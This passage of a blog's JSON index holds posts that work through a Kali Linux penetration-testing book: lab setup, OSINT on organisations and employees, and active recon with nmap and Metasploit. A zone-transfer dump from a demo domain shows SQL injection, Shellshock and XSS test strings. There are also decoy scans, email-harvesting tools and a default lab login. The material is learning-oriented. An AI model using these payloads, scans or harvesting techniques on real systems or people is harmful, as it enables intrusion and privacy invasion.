robinwood.zonetransfer.me. sip.zonetransfer.me. 3333 IN NAPTR 2 3 \u0026#34;P\u0026#34; \u0026#34;E2U+sip\u0026#34; \u0026#34;!^.*$!sip:customer-service@zonetransfer. sqli.zonetransfer.me. 300 IN TXT \u0026#34;\u0026#39; or 1=1 --\u0026#34; sshock.zonetransfer.me. 7200 IN TXT \u0026#34;() { :]}; echo ShellShocked\u0026#34; staging.zonetransfer.me. 7200 IN CNAME www.sydneyoperahouse.com. alltcpportsopen.firewall.test.zonetransfer.me. 301 IN A 127.0.0.1 testing.zonetransfer.me. 301 IN CNAME www.zonetransfer.me. vpn.zonetransfer.me. 4000 IN A 174.36.59.154 www.zonetransfer.me. 7200 IN A 5.196.105.14 xss.zonetransfer.me. 300 IN TXT \u0026#34;\u0026#39;\u0026gt;\u0026lt;script\u0026gt;alert(\u0026#39;Boo\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34; zonetransfer.me. 7200 IN SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 172800 900 3600 ;; Query time: 100 msec ;; SERVER: 34.225.33.2#53(nsztm2.digi.ninja) (TCP) ;; WHEN: Wed Apr 10 07:15:39 BST 2024 ;; XFR size: 51 records (messages 1, bytes 2141) Going through these records from the zone transfer we can see contact details for \u0026ldquo;Robin Wood\u0026rdquo; robin@digi.ninja\n3. Discovering live systems on a network #\rRelying on just DNS scanning isn\u0026rsquo;t sufficient and I will need better tools to gain more useful information.\n3.1 Using netdiscover #\rA helpful built-in tool which comes with kali as a way to scan available devices on a connected network with passive mode available which doesn\u0026rsquo;t probe packets to devices.\nsudo netdiscover -pf # Random, passive and fast scan sudo netdiscover -r 172.30.1.0/24 # Range scan -p Passive option will listen to packets that are being sent -f Fast mode, saves time for auto scans 3.2 Using nmap to discover devices and ports #\rNmap is most known for it\u0026rsquo;s port scanning abilities, but it also have additional features such as scripts exploit for enumeration and device discovery. Find out more about Nmap\u0026rsquo;s host discovery feature: Nmap Manual - host discovery\rnmap -sn 172.30.1.0/24 --exclude 172.30.1.1 # Device range scan, exlcude given ip nmap \u0026lt;IP\u0026gt; # Will scan for ports up to 1000 nmap -A -T4 -p- \u0026lt;IP\u0026gt; # Version scan, Timing, port scan all or specific -p\u0026lt;port range\u0026gt; nmap -O \u0026lt;IP\u0026gt; # Displays the operating system of target nmap \u0026lt;IP\u0026gt; -D\u0026lt;IP1\u0026gt;,\u0026lt;IP2\u0026gt;,.. # Add decoys to scan, ensure decoys are online nmap -sV \u0026lt;IP\u0026gt; # Give version of port technology used 3.3 Using Metasploit to discover ports #\rA framework designed to provide a suite of scripts for recon, exploits, payload generation and post-exploitation features which all fall within their own categories:\nAuxiliary are reconnaissance methods to gather data on a target Exploits will use vulnerabilities found and leverage them on the targeted host Payloads are used to execute commands on a remote host Posts used after a machine has been compromised The recon scripts can be found within the auxiliary category when searching for technologies to scan.\n# Scan for auxiliary tools, add more keywords for specific tech msf6\u0026gt; search auxiliary \u0026lt;keyword\u0026gt; # Load module msf6\u0026gt; use auxiliary/scanner/portscan/syn 3.3.1 Using Metasploit to enumerate SSH ports #\rAn example of using the auxiliary scanners would be to scan for ssh versions which has been open on our target machine.\nUse this tool within the Metasploit framework msf6\u0026gt; use auxiliary/scanner/ssh/ssh-version\nset the target with msf6 (ssh_version)\u0026gt; set RHOSTS \u0026lt;IP\u0026gt; and run\nThis concludes everything for my walkthrough for chapter 3 of ‘The Ultimate Kali Linux Book’ by Glen D. Singh.\nFeel like I am picking up on speed slowly as I am working towards my note taking skills so posting blogs will take less time and will ideally be what I take notes on, anyways next section will be on scanning for vulnerabilities which is the next step after the recon phase. Hope to see you there.\nReferences #\rhttps://digi.ninja/projects/zonetransferme.php - Zone transfer demo https://nmap.org/book/man-host-discovery.html - Nmap host discovery documents ","date":"9 Apr, 2024","externalUrl":null,"permalink":"/posts/ultimate-kali-linux-book/part-3-exploring-active-reconnaissance-techniques/","section":"Blog","summary":"","title":"Part 3 Exploring Active Reconnaissance Techniques","type":"posts"},{"content":"","date":"24 Mar, 2024","externalUrl":null,"permalink":"/tags/anonymity/","section":"Tags","summary":"","title":"Anonymity","type":"tags"},{"content":"Techniques to avoid traces back to identity, browsing the web to collect information on a target and social media account leaks.\nWelcome to the second part of my walkthrough of \u0026lsquo;The Ultimate Kali Linux Book\u0026rsquo; by Glen D. Singh, for this section I will be covering different passive open source intelligence techniques (OISNT) which are ways to collecting information on a target available openly on the internet.\nInformation doesn\u0026rsquo;t need to be secret to be valuable, which is why we should be cautious of what information we put out on the internet. I will be demonstrating common tools used for OSINT, ways to mask investigations from target and how data collected can be used in a attack.\n1. Anonymising Traffic during Investigations #\rWhen penetesting an organisation it\u0026rsquo;s important to mask my identity as #1 it will test out the intrusion detection systems in placed and #2 it\u0026rsquo;s good practice to use OPSEC.\n1.2 Using Proxy chaining to mask traffic #\rA proxy is basicly a computer which you past down requests to a destination for you. A proxy chain is basicly like a relay race where you past the batton (requests) to the next person and they do the same to the last chain.\nHarder to track: Proxy chains are used as they make it harder for a request to be traced back to its original source as logs have to be requested from proxy which can be time consuming and lot of work.\nFind out more on proxies here: [All-on Proxies]\r1.3 Using Virtual Private Networks (VPN) to mask traffic #\rA VPN is similar to a proxy where you relay your traffic to another computer so the request comes from them and shows their ip instead of yours.\nUsing a VPN is great for changing your location but I would say their not a worthy technique to mask traffic as their are lots of issues which arise with VPNs. [1]\nFind out more about VPNs here: [All-on VPNs]\r2. Gathering an Organisation\u0026rsquo;s IT Infrastructure #\rWhen pentesting an organisation, 80% of the process will be gathering information through the internet and scanners, the other 20% will be exploiting findings and writing detailed reports.\nThere are plenty of tools out there that will scrape the internet for information on a target which I think some are more helpful than others but it doesn\u0026rsquo;t hurt to check most of them as one piece of information can make all the difference during recon.\n2.1 Using Whois #\rWhois is a tool which allows you to pull information from a public database of who is behind a certain domain name. When registering a website some services will provide the option to hide information hosted to the databse for a fee.\nThis includes:\nRegistrants Administrative contact information Dates on registration, update and expiration Registry domain ID Name servers 2.1.1 Linux Whois tool #\r$ whois \u0026lt;domain\u0026gt; 2.1.2 Website Whois alternative #\rThere are also whois domain lookup tools online which will organise information pulled in a more readable format such as: https://whois.domaintools.com\n2.2 Using Job Listings #\rAnother great way to get information of an organisation\u0026rsquo;s infrastructure is by looking at job postings for IT positions as these will list technologies they may use.\nHere is what I\u0026rsquo;ve found from a job listing for a system developer programmer post, these can all be researched for vulnerabilities especially the MS SQL server (2008-19) as this shows they may use older software. [2]\n2.3 Shodan.io #\rShodan is an online provider which allows professionals lookup the domain of a website to provide with:\nOpen ports Known vulnerability CVE codes Technologies used hosted on ports This can be useful for discovering possible entry points on a target but I think this isn\u0026rsquo;t worth the $69/month price tag as most results are from large organisations and isn\u0026rsquo;t helpful for smaller targets.\n2.4 Maltego #\rMaltego is a reconnasaince tool which provides a unique way to display scans done through the use of graphs to help you visualise the layout of a target. This can automate the process of scanning for publicly accessible servers, IP addresses, employee\u0026rsquo;s email addresses, subdomains of web pages and more. You can start by creating a new graph \u0026gt; entity menu \u0026gt; infrastructure \u0026gt; click and drag domains onto graph Here is a demonstration of Maltgeo scanning Microsoft.com for similar domains and emails it can scrape from the internet. 3. Gathering Employees\u0026rsquo; information #\rNow it is ever more common to find and gather employee credentials and the culture of an organisation as more and more people use social media as their daily routine which entices them to share things that organisations wouldn\u0026rsquo;t want to be exposed online such as:\nPictures of employee badge Technologies used in background such as on screens, cameras, SCADA systems Uniforms and work culture 3.1 Instagram / Facebook / Linkedin #\rUsing Instagram, Facebook and Linkedin can be helpful as most organisations will have an online precense which is worth check for any valuable information, these can be usually found in posts made, tagged posts or events.\n3.2 Recon-ng #\rThe Recon-ng framework is designed to bring all common OSINT tools under one roof for convinience by providing menus for navigation and management of information found.This tool comes pre-installed with Kali and the documents can be found here: https://github.com/lanmaster53/recon-ng In the demo above I have loaded the \u0026lsquo;whois_procs\u0026rsquo; module which will search for names and emails related to a domain. After configuration the run command is used which will execute the scrapping and produce a list of results: 3.3 theHarvester #\rThe Harvester is another tool which is similar to Recon-ng where it serves as a central tool to scrap information such as emails, names, phone number and more from difference sources. It comes pre-install with Kali and its documents can be found here: https://github.com/laramies/theHarvester\n# Open help menu $ theHarvester -h #Perform a scan with specific module $ theHarvester -d microsoft.com --dns-server 8.8.8.8 [module] 3.4 Sherlock #\rThe Sherlock project is a open-source tool which will search over 200 possible social media platforms for a given username. This is especially helpful to scan for a persons online precences once their username is found (e.g. Instagram username can be used)\nInstallation #\r$ git clone https://github.com/sherlock-project/sherlock.git $ cd sherlock/ $ sudo pip install -r requirements.txt Search accounts with:\n$ python3 sherlock \u0026lt;username\u0026gt; $ python3 sherlock \u0026lt;username\u0026gt; --timeout 5 # 5 sec search May result with unrelated accounts to target\rSherlock is a great tool however, it may result with accounts that aren\u0026rsquo;t related to the target if their username is common or too broad but it is still worth looking through the list\nThis concludes everything for my walkthrough or the reconnaissance and footprinting section of ‘The Ultimate Kali Linux Book’ by Glen D. Singh. In the next section I will be covering active reconnaissance techniques such as nmap, Google dorks, metasploit and more.\nReferences #\rhttps://restoreprivacy.com/vpn/warning-list/ https://www.cvedetails.com/vulnerability-list/vendor_id-26/product_id-251 https://github.com/lanmaster53/recon-ng https://github.com/laramies/theHarvester ","date":"24 Mar, 2024","externalUrl":null,"permalink":"/posts/ultimate-kali-linux-book/part-2-reconnaissance-and-footprint/","section":"Blog","summary":"","title":"Part 2 Reconnaissance and Footprint","type":"posts"},{"content":"","date":"17 Mar, 2024","externalUrl":null,"permalink":"/tags/lab/","section":"Tags","summary":"","title":"Lab","type":"tags"},{"content":"Building virtual machines, installing Kali Linux, Metasploitable 2\u0026amp;3, OWASP web applications and windows machines for advanced testing.\nWelcome to the first part of my walkthrough for \u0026lsquo;The Ultimate Kali Linux Book\u0026rsquo; by Glen D. Singh, this is a highly recommended book from Packt which have a reputation of providing top quality content for the IT industry. In this part I will be building multiple lab environments with vulnerable machines which I can utilise to test out different penetration techniques in a safe and legal network.\n1. First lab within VirtualBox #\rThe diagram demonstrate the environment for this first network lab where I will be using a popular penetration OS, Kali Linux to test out the different tools that comes within its arsenal.\nFor the virtual machine of choice I went with Vbox due to previous experience with the software in the past however, upon research for different types of virtualisation I came across KVM/Qemu which is a fully open-source and a higher frequency of security update with transparent reports whereas Oracle provides security through obscurity.\n2. Setting up network interfaces using vboxmanage #\rInside a terminal type the following commands\nCreate a dhcpserver called \u0026ldquo;PentestNet\u0026rdquo; vboxmanage dhcpserver add --network=PentestNet --server-ip=172.30.1.1 --lower-ip=172.30.1.20 --upper-ip=172.30.1.50 --netmask=255.255.255.0 --enable Create a dhcpserver called \u0026ldquo;HiddenNet\u0026rdquo; vboxmanage dhcpserver add --network=HiddenNet --server-ip=10.11.12.1 --lower-ip=10.11.12.20 --upper-ip=10.11.12.50 --netmask=255.255.255.0 --enable Create a dhcpserver called \u0026ldquo;RedTeamLab\u0026rdquo; vboxmanage dhcpserver add --network=RedTeamLab --server-ip=192.168.42.1 --lower-ip=192.168.42.20 --upper-ip=192.168.42.50 --netmask=255.255.255.0 --enable 3. Setting up Kali Linux #\rGoing through the standard VMware installation for Kali linux I will need to assign it to networks so it has LAN connection to the other machines.\nIn settings of Kali VM, Adapter 1: Adapter 2: Adapter 3: 4. Setting up Metasploitable 2 #\rInstall the iso file on the internet at https://sourceforge.net/projects/metasploitable/files/Metasploitable2/ and go through standard installation on VMware:\nIn VirtualBox New \u0026gt; Expert Mode \u0026gt; Name: Metasploitable2 \u0026gt; Memory:512M \u0026gt; Hard Disk \u0026gt; Use an Existing Virtual Hard Disk File \u0026gt; Hard Disk Selector \u0026gt; Add Metastpoitable.vmdk \u0026gt; Choose \u0026gt; Finish In settings of Metasploitable 2 Adapter 1: 5. Setting up Metasploitable 3 #\rTo install Metasploitable 3 I used Vagrant, a command line utility tool to manage and download virtual machines pre-made on it\u0026rsquo;s repository. The installation process is simple and can be found here https://developer.hashicorp.com/vagrant/install.\nThe following commands were used:\n$ vagrant plugin install vagrant-reload $ vagrant plugin install vagrant-vbguest $ mkdir metasploitable3-workspace $ cd metasploitable3-workspace $ curl -O https://raw.githubusercontent.com/rapid7/metasploitable3/master/Vagrantfile \u0026amp;\u0026amp; vagrant up Encountering IP address configuration error during setup\rWhen setting up Vagrant I encountered an error message on a misconfigured IP range, upon further research I came across someone with a similar problem and found a solution here [1]\nIssue prompt: Fix for IP issue:\nsudo vim /etc/vbox/networks.conf Add an asterisk * in front of the lines *10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 *2001::/64 If the windows vagrant machine isn\u0026rsquo;t working try the command: vagrant up win2k8 6. Setting up OWASP Juice Shop website #\rOn the Kali Linux VM terminal: $ curl -fsSL https://download.docker.com/linux/debian/gpg | gpg - dearmor | sudo tee /usr/share/keyrings/docker-archive-keyring.gpg \u0026gt;/dev/null $ echo \u0026#39;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/debian buster stable\u0026#39; | sudo tee /etc/apt/sources.list.d/docker.list $ sudo apt install -y docker-ce docker-ce-cli containerd.io $ sudo docker pull bkimminich/juice-shop $ sudo docker pull bkimminich/juice-shop Connect to OWASP website http://localhost:3000 7. Setting up OWASP Broken Web Applications #\rInstall the zip file on the internet at https://sourceforge.net/projects/owaspbwa/files/\nThis will contain pre-made Vbox machines which needs to be connected to the lab network:\nVM Box \u0026gt; New \u0026gt; Expert Mode \u0026gt; Name: OWASP BWA \u0026gt; Type: Linux \u0026gt; Memory: 1024 MB \u0026gt; Hard Disk Selector add: OWASP Broken Web Apps-cl1.vmdk \u0026gt; Choose \u0026gt; Finish Click on Settings of OWASP Web \u0026gt; Network \u0026gt; Adapter 1 \u0026gt; Attached to: Internal Network \u0026gt; Name: PentestNet \u0026gt; OK Login : root:owaspbwa Here is what directing to the broken OWASP on a web browser should look like: This was it for this walkthrough on how to install and setuping up multiple virtual machines and having them connected to a private network for testing, there is an extended section to setup an environment for advanced hacking techniques but will be covered in a later part. Next I will be covering passive information-gather, one of the most important step to a great attack.\nReferences #\rhttps://stackoverflow.com/questions/70704093/the-ip-address-configured-for-the-host-only-network-is-not-within-the-allowed-ra ","date":"17 Mar, 2024","externalUrl":null,"permalink":"/posts/ultimate-kali-linux-book/part-1-buidling-a-penetration-testing-lab/","section":"Blog","summary":"","title":"Part 1 Building a Penetesting Lab","type":"posts"},{"content":"","date":"17 Mar, 2024","externalUrl":null,"permalink":"/tags/pentesting/","section":"Tags","summary":"","title":"Pentesting","type":"tags"},{"content":"","date":"1 Jan, 2020","externalUrl":null,"permalink":"/posts/","section":"Blog","summary":"","title":"Blog","type":"posts"},{"content":"","externalUrl":null,"permalink":"/all-in-one/","section":"All-in-Ones","summary":"","title":"All-in-Ones","type":"all-in-one"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/tags/goverment/","section":"Tags","summary":"","title":"Goverment","type":"tags"}]